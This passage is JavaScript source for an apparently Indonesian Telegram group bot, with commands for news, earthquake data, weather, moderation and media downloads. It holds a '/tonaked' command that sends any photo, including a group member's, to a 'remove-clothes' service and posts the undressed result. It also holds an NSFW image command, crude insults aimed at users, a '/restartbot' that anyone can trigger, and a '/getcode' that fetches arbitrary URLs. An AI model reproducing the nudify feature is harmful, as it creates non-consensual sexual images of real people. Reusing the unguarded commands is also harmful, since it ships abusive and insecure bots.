  const waktu = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

  // Pesan balasan
  const pesan = `📅 *Info Hari Ini*\n\n🗓️ Tanggal: ${tanggal}\n⏰ Waktu: ${waktu} WIB\n\nSelamat menjalani hari dengan semangat! 💪`;
  bot.sendMessage(chatId, pesan, { parse_mode: 'Markdown' });
});

bot.onText(/^\/faktaunik$/, async (msg) => {
  const chatId = msg.chat.id; 
  // Daftar fakta unik — bisa kamu tambah sesuka hati
  const fakta = [
    "💡 Lebah bisa mengenali wajah manusia!",
    "🌎 Gunung Everest tumbuh sekitar 4 milimeter setiap tahun.",
    "🐙 Gurita memiliki tiga jantung dan darah berwarna biru.",
    "🧊 Air panas bisa membeku lebih cepat daripada air dingin — disebut efek Mpemba.",
    "🚀 Jejak kaki di bulan akan bertahan jutaan tahun karena tidak ada angin.",
    "🐘 Gajah tidak bisa melompat, satu-satunya mamalia besar yang tidak bisa.",
    "🦋 Kupu-kupu mencicipi dengan kakinya!",
    "🔥 Matahari lebih putih daripada kuning jika dilihat dari luar atmosfer.",
    "🐧 Penguin jantan memberikan batu kepada betina sebagai tanda cinta.",
    "🌕 Di Venus, satu hari lebih panjang daripada satu tahunnya!"
  ];

  // Pilih fakta secara acak
  const randomFakta = fakta[Math.floor(Math.random() * fakta.length)];
    
  await bot.sendMessage(chatId, `🎲 *Fakta Unik Hari Ini:*\n\n${randomFakta}`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/^\/dunia$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🌍 Sedang mengambil berita dunia..."); 
  try {
    const url = "https://feeds.bbci.co.uk/news/world/rss.xml";
    const res = await fetch(url);
    const xml = await res.text();
      
    // Ambil 5 judul dan link pertama pakai regex
    const items = [...xml.matchAll(/<item>.*?<title><!\[CDATA\[(.*?)\]\]><\/title>.*?<link>(.*?)<\/link>/gs)]
      .slice(0, 5)
      .map(m => `• [${m[1]}](${m[2]})`)
      .join("\n\n");
      
    if (!items) throw new Error("Data kosong");
      
    const message = `🌎 *Berita Dunia Terbaru*\n\n${items}\n\n📰 _Sumber: ©GerZx News_`;
    await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error(e);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil berita dunia. Coba lagi nanti.");
  }
});

bot.onText(/\/gempa/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
    const data = await res.json();
    const gempa = data.Infogempa.gempa;
    const info = `
📢 *Info Gempa Terbaru BMKG*
📅 Tanggal: ${gempa.Tanggal}
🕒 Waktu: ${gempa.Jam}
📍 Lokasi: ${gempa.Wilayah}
📊 Magnitudo: ${gempa.Magnitude}
📌 Kedalaman: ${gempa.Kedalaman}
🌊 Potensi: ${gempa.Potensi}
🧭 Koordinat: ${gempa.Coordinates}
🗺️ *Dirasakan:* ${gempa.Dirasakan || "-"}
Sumber: ©GerZx
    `;
    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data gempa dari BMKG.");
  }
});

bot.onText(/^\/tonaked(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = msg.text.split(' ').slice(1).join(' ');
  let imageUrl = args || null; 
  // Kalau reply ke foto
  if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
    const fileId = msg.reply_to_message.photo.pop().file_id;
    const fileLink = await bot.getFileLink(fileId);
    imageUrl = fileLink;
  }

  if (!imageUrl) {
    return bot.sendMessage(chatId, '🪧 ☇ Format: /tonaked (reply gambar)');
  }

  const statusMsg = await bot.sendMessage(chatId, '⏳ ☇ Memproses gambar...');
  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`);
    const data = await res.json();
    const hasil = data.result;

    if (!hasil) {
      return bot.editMessageText('❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid', {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
    }

    await bot.deleteMessage(chatId, statusMsg.message_id);
    await bot.sendPhoto(chatId, hasil);

  } catch (e) {
    console.error(e);
    await bot.editMessageText('❌ ☇ Terjadi kesalahan saat memproses gambar', {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });
  }
});

const started = Date.now();
bot.onText(/^\/uptime$/, (msg) => {
  const s = Math.floor((Date.now()-started)/1000);
  const h = Math.floor(s/3600), m = Math.floor((s%3600)/60);
  bot.sendMessage(msg.chat.id, `⏱ Bot aktif: ${h} jam ${m} menit`);
});

bot.onText(/^\/pair$/, async (msg) => {
  const members = await bot.getChatAdministrators(msg.chat.id);
  const names = members.map(m=>m.user.first_name);
  const a = names[Math.floor(Math.random()*names.length)];
  const b = names[Math.floor(Math.random()*names.length)];
  bot.sendMessage(msg.chat.id, `💞 Pasangan hari ini: ${a} ❤️ ${b}`);
});

let groupRules = {};
bot.onText(/^\/setrules (.+)/, (msg, match) => {
  groupRules[msg.chat.id] = match[1];
  bot.sendMessage(msg.chat.id, "✅ Aturan grup disimpan.");

});

bot.onText(/^\/rules$/, (msg) => {
  const rules = groupRules[msg.chat.id] || "Belum ada aturan.";
  bot.sendMessage(msg.chat.id, `📜 *Aturan Grup:*\n${rules}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/tagadmin$/, async (msg) => {
  const members = await bot.getChatAdministrators(msg.chat.id);
  const names = members.slice(0,30).map(m => `@${m.user.username || m.user.first_name}`).join(" ");
  bot.sendMessage(msg.chat.id, `📢 ${names}`);
});

bot.onText(/^\/admins$/, async (msg) => {
  const list = await bot.getChatAdministrators(msg.chat.id);
  const names = list.map(a => `👑 ${a.user.first_name}`).join("\n");
  bot.sendMessage(msg.chat.id, `*Daftar Admin:*\n${names}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/groupinfo$/, async (msg) => {
  if (!msg.chat.title) return bot.sendMessage(msg.chat.id, "❌ Perintah ini hanya untuk grup.");
  const admins = await bot.getChatAdministrators(msg.chat.id);
  bot.sendMessage(msg.chat.id, `
👥 *Group Info*
📛 Nama: ${msg.chat.title}
🆔 ID: ${msg.chat.id}
👑 Admins: ${admins.length}
👤 Anggota: ${msg.chat.all_members_are_administrators ? "Admin semua" : "Campuran"}
  `, { parse_mode: "Markdown" });
});

bot.onText(/^\/restartbot$/, (msg) => {
  bot.sendMessage(msg.chat.id, "♻️ Restarting bot...");
  setTimeout(() => process.exit(0), 1000);
});
    
const statFile = './stat.json';
if (!fs.existsSync(statFile)) fs.writeFileSync(statFile, "{}");
let stat = JSON.parse(fs.readFileSync(statFile));
function saveStat(){ fs.writeFileSync(statFile, JSON.stringify(stat, null, 2)); }
bot.on('message', (msg) => {
  const id = msg.from.id;
  stat[id] = (stat[id] || 0) + 1;
  saveStat();
});

bot.onText(/^\/stat$/, (msg)=>{
  let data = Object.entries(stat).sort((a,b)=>b[1]-a[1]).slice(0,5);
  let text = "📊 5 User Paling Aktif:\n";
  data.forEach(([id,count],i)=>text+=`${i+1}. ID:${id} -> ${count} pesan\n`);
  bot.sendMessage(msg.chat.id,text);
});

bot.onText(/^\/maps (.+)/, (msg, match)=>{
  const lokasi = match[1];
  const link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lokasi)}`;
  bot.sendMessage(msg.chat.id, `🗺 Lokasi ditemukan:\n${link}`);
});

const duel = {};
bot.onText(/^\/duel (@.+)/, (msg, match) => {
  duel[msg.chat.id] = match[1];
  bot.sendMessage(msg.chat.id, `${msg.from.username} menantang ${match[1]}! Gunakan /terima untuk mulai.`);
});

bot.onText(/^\/terima$/, (msg) => {
  if (!duel[msg.chat.id]) return;
  const players = [msg.from.username, duel[msg.chat.id]];
  const winner = players[Math.floor(Math.random() * players.length)];
  bot.sendMessage(msg.chat.id, `⚔ Duel dimulai...\n🏆 Pemenang: ${winner}`);
  delete duel[msg.chat.id];
});

bot.onText(/^\/speed$/, (msg) => {
  const start = Date.now();
  bot.sendMessage(msg.chat.id, "⏱ Mengukur...").then(() => {
    const end = Date.now();
    bot.sendMessage(msg.chat.id, `⚡ Respon bot: ${end - start} ms`);
  });
});

bot.onText(/^\/cuaca (.+)/, async (msg, match) => {
  const kota = match[1];
  const url = `https://wttr.in/${encodeURIComponent(kota)}?format=3`;
  try {
    const res = await fetch(url);
    const data = await res.text();
    bot.sendMessage(msg.chat.id, `🌤 Cuaca ${data}`);
  } catch {
    bot.sendMessage(msg.chat.id, "⚠ Tidak bisa mengambil data cuaca");
  }
});

bot.onText(/\/cekid/, (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username;
  const randomImage = getRandomImage();
  const id = msg.from.id;
  const owner = "8161803979"; // Ganti dengan ID pemilik bot
  const text12 = `Halo @${sender}
╭────⟡
│ 👤 Nama: @${sender}
│ 🆔 ID: ${id}
╰────⟡
<blockquote>by @RAMZXHYNEWERA</blockquote>
`;
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
        [{ text: "OWNER", url: "https://t.me/RAMZXHYNEWERA" }],
        ],
      ],
    },
  };
  bot.sendPhoto(chatId, randomImage, {
    caption: text12,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

bot.onText(/^\/whoami$/, (msg) => {
  const user = msg.from;
  const info = `
🪪 <b>Data Profil Kamu</b>
━━━━━━━━━━━━━━━━━━
👤 Nama: ${user.first_name || "-"} ${user.last_name || ""}
🏷 Username: @${user.username || "Tidak ada"}
🆔 ID: <code>${user.id}</code>
🌐 Bahasa: ${user.language_code || "unknown"}
  `;
  bot.sendMessage(msg.chat.id, info, { parse_mode: "HTML" });
});

// =========================
// 🚫 AntiLink Simple Version
// =========================

let antiLink = true; // default aktif
const linkPattern = /(https?:\/\/|t\.me|www\.)/i;

// Command /antilink on/off
bot.onText(/^\/antilink (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const status = match[1].toLowerCase();

  if (status === "on") {
    antiLink = true;
    bot.sendMessage(chatId, "✅ AntiLink diaktifkan!");
  } else {
    antiLink = false;
    bot.sendMessage(chatId, "⚙️ AntiLink dimatikan!");
  }
});

// Hapus pesan jika ada link
bot.on("message", (msg) => {
  if (!antiLink) return;
  if (!msg.text) return;

  const chatId = msg.chat.id;
  if (linkPattern.test(msg.text)) {
    bot.deleteMessage(chatId, msg.message_id).catch(() => {});
    bot.sendMessage(chatId, "🚫 Pesan berisi link telah dihapus otomatis!");
  }
});

bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const randomImage = getRandomImage();
    const userId = msg.from.id; 
            //cek prem //
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>#XyrusToxic  ⚘</blockquote>
Oi kontol kalo mau akses comandd ini,
/addprem dulu bego 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "X - DEVLOVER", url: "https://t.me/RAMZXHYNEWERA" }], 
      ]
    }
  });
}
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "♥️ /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ CODE DARI ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "♥️🥹 ERROR SAAT MENGAMBIL CODE WEB");
  }
});

bot.onText(/\/panelinfo/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Daftar ID owner dari config.js
  const ownerIds = config.OWNER_ID || [];

  // Cek apakah user adalah owner
  if (!ownerIds.includes(String(userId))) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa melihat informasi panel ini!");
  }

  // Jika owner, tampilkan info sistem
  const os = require("os");
  const axios = require("axios");

  const hostname = os.hostname();
  const platform = os.platform();
  const arch = os.arch();
  const cpuModel = os.cpus()[0].model;
  const cpuCore = os.cpus().length;
  const totalMem = Math.round(os.totalmem() / 1024 / 1024);
  const uptimeOs = Math.floor(os.uptime() / 3600);
  const now = new Date().toLocaleString("id-ID");

  // Ambil IP publik
  let ip = "Tidak terdeteksi";
  try {
    const res = await axios.get("https://api.ipify.org?format=json");
    ip = res.data.ip;
  } catch (e) {
    ip = "Tidak terhubung ke internet";
  }

  const text = `
💻 <blockquote>PANEL INFORMATION<blockquote>
━━━━━━━━━━━━━━━━━━
🖥️ <b>Hostname:</b> ${hostname}
🧠 <b>CPU:</b> ${cpuModel} (${cpuCore} Core)
💾 <b>Total RAM:</b> ${totalMem} MB
⚙️ <b>OS:</b> ${platform.toUpperCase()} (${arch})
📡 <b>Public IP:</b> ${ip}
⏱️ <b>Uptime Server:</b> ${uptimeOs} jam
📅 <b>Waktu:</b> ${now}
━━━━━━━━━━━━━━━━━━
<blockquote>Data real-time dari panel host kamu.<blockquote>
`;

  await bot.sendMessage(chatId, text, { parse_mode: "HTML" });
});

bot.onText(/\/chat (.+)/, (msg, match) => {
    const messageText = match[1]; 
    sendNotifOwner(msg, `Pesan dari pengguna: ${messageText}`)
      .then(() => {
        bot.sendMessage(msg.chat.id, 'pesan anda telah di kirim ke gerz tunggu ya');
      })
      .catch(() => {
        bot.sendMessage(msg.chat.id, 'terjadi kesalahan saat mengirim pesan.');
      });
});

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const argsRaw = match[1]; 
  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    // Validasi delay
    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    // Kirim sticker (bot API auto-detects WebP/GIF)
    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1]; 
  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Nih hasilnya`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id; 
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});

bot.onText(/\/nfsw/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const name = msg.from.first_name;
    
  try {
    const res = await fetch("https://api.waifu.pics/nsfw/waifu");
    const json = await res.json();
    const imageUrl = json.url;

    await bot.sendPhoto(chatId, imageUrl, {
      caption: `🔞 *NSFW Waifu Request*\n\n• Permintaan oleh: [${name}](tg://user?id=${userId})\n• Source: waifu.pics\n\n_Awas panas! Ini waifu versi dewasa 😈_`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "next waifu", callback_data: "waifu18_next" },
            { text: "about dev", url: "https://t.me/RAMZXHYNEWERA" }
          ],
          [
            { text: "closed", callback_data: "close" }
          ]
        ]
      }
    });
  } catch (err) {
    await bot.sendMessage(chatId, "❌ Gagal memuat waifu. Coba lagi nanti.");
  }
});

bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const msg = callbackQuery.message;

  if (data === "waifu18_next") {
    try {
      const res = await fetch("https://api.waifu.pics/nsfw/waifu");
      const json = await res.json();
      const imageUrl = json.url;

      await bot.editMessageMedia(
        {
          type: "photo",
          media: imageUrl,
          caption: `🔞 *NSFW NIH LU SANGE?*\n\n_PASTI NGOCOK_ 😈`,
          parse_mode: "Markdown"
        },
        {
          chat_id: msg.chat.id,
          message_id: msg.message_id,
          reply_markup: {
            inline_keyboard: [
              [
                { text: "next waifu", callback_data: "waifu18_next" },
                { text: "about dev", url: "https://t.me/RAMZXHYNEWERA" }
              ],
              [
                { text: "closed", callback_data: "close" }
              ]
            ]
          }
        }
      );
    } catch (err) {
      await bot.answerCallbackQuery(callbackQuery.id, {
        text: "⚠️ Gagal ambil waifu baru!",
        show_alert: true
      });
    }
  }

  if (data === "close") {
    bot.deleteMessage(msg.chat.id, msg.message_id);
  }
});

bot.onText(/^\/mute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    
    // Harus reply pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ balas pesan pengguna yang ingin di-mute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah yang memanggil adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ hanya admin yang bisa menggunakan perintah ini.');
        }

        // Mute user: hanya non-admin yang bisa dimute
        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: false,
                can_send_media_messages: false,
                can_send_polls: false,
                can_send_other_messages: false,
                can_add_web_page_previews: false,
                can_change_info: false,
                can_invite_users: false,
                can_pin_messages: false
            }
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ si kontol [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di mute😹.`,
            { parse_mode: 'Markdown' });

        // Balas pesan yang dimute
        await bot.sendMessage(chatId,
            '🚫 *pengguna anj telah di mute di grup ini oleh admin.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat mute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan mute.');
    }
});

bot.onText(/^\/unmute$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ balas pesan pengguna yang ingin di-unmute.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ hanya admin yang bisa menggunakan perintah ini.');
        }

        // Unmute pengguna
        await bot.restrictChatMember(chatId, targetUser.id, {
            permissions: {
                can_send_messages: true,
                can_send_media_messages: true,
                can_send_polls: true,
                can_send_other_messages: true,
                can_add_web_page_previews: true,
                can_invite_users: true,
                can_pin_messages: false,  // Bisa disesuaikan
                can_change_info: false    // Bisa disesuaikan
            }
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ si baby [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di unmute🤓.`,
            { parse_mode: 'Markdown' });

        // Balas ke pesan pengguna
        await bot.sendMessage(chatId,
            '🔊 *pengguna telah di-unmute di grup ini, silakan mengobrol kembali.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat unmute:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan unmute.');
    }
});

bot.onText(/^\/ban$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-ban.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Ban pengguna
        await bot.banChatMember(chatId, targetUser.id);

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-ban.`,
            { parse_mode: 'Markdown' });

        // Pesan follow-up di bawah reply
        await bot.sendMessage(chatId,
            '🚫 *Pengguna telah di-ban dari grup ini oleh admin.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat ban:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan ban.');
    }
});

bot.onText(/^\/unban$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;


    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-unban.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Unban pengguna
        await bot.unbanChatMember(chatId, targetUser.id, {
            only_if_banned: true
        });

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-unban.`,
            { parse_mode: 'Markdown' });

        // Pesan tambahan
        await bot.sendMessage(chatId,
            '🔓 *Pengguna telah di-unban dari grup ini, silakan bergabung kembali.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat unban:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan unban.');
    }
});

bot.onText(/^\/kick$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Harus membalas pesan
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Balas pesan pengguna yang ingin di-kick.');
    }

    const targetUser = msg.reply_to_message.from;

    try {
        // Cek apakah pengirim adalah admin
        const admins = await bot.getChatAdministrators(chatId);
        const isAdmin = admins.some(admin => admin.user.id === fromId);
        if (!isAdmin) {
            return bot.sendMessage(chatId, '❌ Hanya admin yang bisa menggunakan perintah ini.');
        }

        // Kick: ban lalu unban agar bisa join lagi
        await bot.banChatMember(chatId, targetUser.id);
        await bot.unbanChatMember(chatId, targetUser.id);

        // Notifikasi ke grup
        await bot.sendMessage(chatId,
            `✅ Pengguna [${targetUser.first_name}](tg://user?id=${targetUser.id}) telah di-kick.`,
            { parse_mode: 'Markdown' });

        // Pesan tambahan sebagai reply
        await bot.sendMessage(chatId,
            '👢 *Pengguna telah di-kick dari grup ini oleh admin. Pengguna dapat bergabung kembali jika diperbolehkan.*',
            {
                parse_mode: 'Markdown',
                reply_to_message_id: msg.reply_to_message.message_id
            });

    } catch (err) {
        console.error('❌ Error saat kick:', err);
        bot.sendMessage(chatId, '❌ Gagal melakukan kick.');
    }
});

bot.onText(/^\/instagramstalk(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!input) {
    return bot.sendMessage(chatId, '❌ Kirim username Instagram setelah command, contoh:\n/instagramstalk google');
  }

  try {
    const response = await axios.post('https://api.siputzx.my.id/api/stalk/instagram', {
      username: input
    }, {
      headers: {
        'Content-Type': 'application/json',
        'Accept': '*/*'
      }
    });

    const data = response.data;
    if (!data.status) {
      return bot.sendMessage(chatId, '❌ Data tidak ditemukan atau username salah.');
    }

    const ig = data.data;

    const msgText = `
📸 *Instagram Profile Info*

👤 Username: ${ig.username}
👑 Full Name: ${ig.full_name}
📝 Biography: ${ig.biography || '-'}
🔗 External URL: ${ig.external_url || '-'}
📊 Followers: ${ig.followers_count.toLocaleString()}
👥 Following: ${ig.following_count.toLocaleString()}
📬 Posts: ${ig.posts_count.toLocaleString()}
🔒 Private: ${ig.is_private ? 'Yes' : 'No'}
✔️ Verified: ${ig.is_verified ? 'Yes' : 'No'}
🏢 Business Account: ${ig.is_business_account ? 'Yes' : 'No'}
`.trim();

    await bot.sendPhoto(chatId, ig.profile_pic_url, {
      caption: msgText,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data Instagram.');
  }
});

bot.onText(/\/pinterest(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a search query.\n\nExample:\n/pinterest iPhone 17 Pro Max");
    }

    const query = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result || data.result.length === 0) {
            return bot.sendMessage(chatId, "❌ No Pinterest images found for your query.");
        }

        // Ambil gambar pertama dari hasil
        const firstResult = data.result[0];

        await bot.sendPhoto(chatId, firstResult, {
            caption: `📌 Pinterest Result for: *${query}*`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Pinterest API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Pinterest image. Please try again later.");
    }
});

bot.onText(/^\/remini(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  let fileUrl;

  try {
    // Kalau reply ke foto
    if (msg.reply_to_message && msg.reply_to_message.photo) {
      const fileId = msg.reply_to_message.photo.slice(-1)[0].file_id;
      const fileLink = await bot.getFileLink(fileId);
      fileUrl = fileLink;
    } else {
      // Kalau pakai link
      const text = match[1];
      if (!text || !text.startsWith("http")) {
        return bot.sendMessage(
          chatId,
          "❌ Kirim perintah dengan membalas foto atau menyertakan URL gambar.\nContoh:\n`/remini https://example.com/image.jpg`",
          { parse_mode: "Markdown" }
        );
      }
      fileUrl = text.trim();
    }

    await bot.sendMessage(chatId, "⏳ Sedang meningkatkan kualitas gambar...");

    // Proses gambar via API Remini
    const response = await axios.get(
      `https://fastapi.acodes.my.id/api/generator/remini?url=${encodeURIComponent(fileUrl)}`,
      { responseType: "arraybuffer" }
    );

    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: "✅ Gambar berhasil ditingkatkan kualitasnya!",
    });
  } catch (err) {
    console.error("Remini error:", err.message || err);
    bot.sendMessage(chatId, "❌ Gagal memproses gambar. Pastikan URL valid atau reply ke foto.");
  }
});

// Test Function
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
